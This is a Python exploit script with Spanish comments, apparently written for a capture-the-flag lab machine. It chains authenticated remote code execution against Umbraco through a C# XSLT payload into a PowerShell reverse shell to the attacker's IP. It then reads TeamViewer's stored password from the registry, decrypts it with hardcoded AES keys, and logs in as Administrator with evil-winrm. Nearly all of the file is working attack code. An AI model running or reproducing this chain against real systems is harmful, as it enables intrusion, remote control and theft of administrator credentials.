#!/usr/bin/python3

from bs4 import BeautifulSoup
from pwn import *
from threading import Thread
from Crypto.Cipher import AES
from itertools import product
import Crypto.Cipher.AES, argparse, pwn, requests, time, re, subprocess

# Configuracion
target = "10.10.10.180"
user = "Administrator"


def main():
    login = args.user
    password = args.password
    host = args.host

    context.log_level = 'critical'
    
    try:
        initial = pwn.listen(4444)
        final = pwn.listen(4445)
    except Exception as e:
        raise e

    with open('exploit.cs', 'r') as csharp:
        code = csharp.read().strip()

    payload = f"""
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" 
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
        xmlns:msxsl="urn:schemas-microsoft-com:xslt" 
        xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
        <msxsl:script language="C#" implements-prefix="csharp_user">
{code}
        </msxsl:script>
        <xsl:template match="/">
            <xsl:value-of select="csharp_user:xml()"/>
        </xsl:template>
    </xsl:stylesheet>
    """
    payload = payload.strip() % (args.ip, 4444)
    stable_revshell = '$client = New-Object System.Net.Sockets.TCPClient("%s", 4445)' % args.ip
    stable_revshell += ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    # Process Login
    url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
    #log.info(f'Logeandonos {url_login}')
    loginfo = { "username": login, "password": password}
    s = requests.session()
    r2 = s.post(url_login,json=loginfo)

    # Go to vulnerable web page
    url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
    log.info("Lanzando exploit")
    r3 = s.get(url_xslt)

    soup = BeautifulSoup(r3.text, 'html.parser')
    VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
    VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
    UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
    headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
    data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
        "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
        "ctl00$body$xsltSelection": payload,
        "ctl00$body$contentPicker$ContentIdValue": "",
        "ctl00$body$visualizeDo": "Visualize+XSLT" }

    # Launch the attack
    Thread(target=s.post, args=(url_xslt,), kwargs={'data': data, 'headers': headers}).start()

    initial.wait_for_connection()
    initial.sendline(stable_revshell.encode('ascii'))
    final.wait_for_connection()

    context.log_level = 'info'
    
    # Comprobamos que este el proceso TeamViewer
    final.sendline(b'tasklist')
    output = final.recvrepeat(2)
    if "teamviewer" in output.lower().decode():
        log.success("El proceso de TeamViewer esta activo")
    else:
        log.error("El proceso de TeamViewer no esta activo")
    
    # Comprobar si la version es vulnerable
    time.sleep(1)
    final.sendline(b'dir "C:\\Program Files (x86)\\TeamViewer"')
    output = final.recvrepeat(3).decode().strip().lower()
    
    versiones_vulnerables = ["version7", "version8", "version9", "version10", "version11", "version12", "version13", "version14", "version15"]
    version_detectada = None
        
    for v in versiones_vulnerables:
        if v in output:
            version_detectada = v
            break
     
    
    # Extraer contrase単as guardadas en TeamViewer
    time.sleep(1)
    log.info("Extrayendo contrase単as guardadas en el registro de TeamViewer")
    #final.sendline(b"cd HKLM:SOFTWARE\\WOW6432Node\\TeamViewer\\Version7")
    final.sendline(f"(Get-ItemProperty 'HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\{version_detectada}').SecurityPasswordAES".encode())
    #time.sleep(1)
    #final.sendline(b"(Get-ItemProperty .).SecurityPasswordAES")
    output = final.recvrepeat(2).decode().strip()
    
    output = output.replace("\r\n", ",")
    numbers = re.findall(r'\d+', output)
    
    try:
        ints = [int(i) for i in numbers]
    except Exception as e:
        log.error(f"Error inesperado: {e}")
    
    if not ints: 
        raise RuntimeError("No se recibieron bytes")
    cifrado = ints.pop()
    
    # Crackeamos los bytes cifrados
    # La key y la IV son siempre fijas en versiones viejas como la 7 a la 15
    # Clave secreta que AES usara para desencriptar
    key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    # Es el vector de inicializacion, necesario para encontrar la contrase単a
    IV = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

    # Le pasamos los valores y le decimos que cada bloque depende del anterior para desifrarse
    decipher = AES.new(key,AES.MODE_CBC,IV)

    # Son los bytes cifrados y los pasamos a bytes para que AES lo interprete
    ciphertext = bytes(ints)

    # Desifra los bytes y los pasamos a strings
    plaintext = decipher.decrypt(ciphertext).decode('utf-16-le')
    # Sacamos los null bytes del padding y eliminamos cualquier espacio o salto de linea
    plaintext = plaintext.rstrip('\x00').strip()
    log.success(f"La contrase単a es: {plaintext}")
    
    # Nos logeamos como admin
    time.sleep(1)
    log.success("Logeandonos como Administrator")
    subprocess.run(f"evil-winrm -i {target} -u '{user}' -p '{plaintext}'", shell=True, text=True, check=True)
    
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='exploit.py',
        description='Umbraco authenticated RCE',
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=80))
    parser.add_argument('-u', '--user', metavar='USER', type=str,
        required=True, dest='user', help='Username / Email')
    parser.add_argument('-p', '--password', metavar='PASS', type=str,
        required=True, dest='password', help='Login password')
    parser.add_argument('-w', '--website-url', metavar='URL', type=str, required=True,
        dest='host', help='Root URL')
    parser.add_argument('-i', '--ip', metavar='IP', type=str, required=True,
        dest='ip', help='IP address of callback listener')
    args = parser.parse_args()
    main()
